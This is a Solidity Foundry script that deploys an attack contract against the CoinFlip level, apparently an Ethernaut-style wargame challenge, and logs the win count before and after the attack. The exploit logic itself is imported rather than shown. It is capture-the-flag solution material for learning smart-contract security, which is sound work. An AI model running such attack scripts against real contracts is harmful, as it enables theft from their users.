// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/levels/CoinFlip.sol";
import {CoinFlipAttack} from "../src/attacks/CoinFlipAttack.sol";

contract CoinFlipScript is Script {
    CoinFlip public instance = CoinFlip(payable(0x33b5d72a9F5A9F8E1E56c9E7Aa85B65B66cF44fC));
    CoinFlipAttack public attacker;

    function run() external {
        vm.startBroadcast();
        attacker = new CoinFlipAttack(address(instance));
        console.log("CoinFlipAttack Contract deployed to:", address(attacker));
        console.log("Consecutive wins:", instance.consecutiveWins());
        console.log("Attacking...");
        attacker.attack();
        console.log("New consecutive wins:", instance.consecutiveWins());
        vm.stopBroadcast();
    }
}
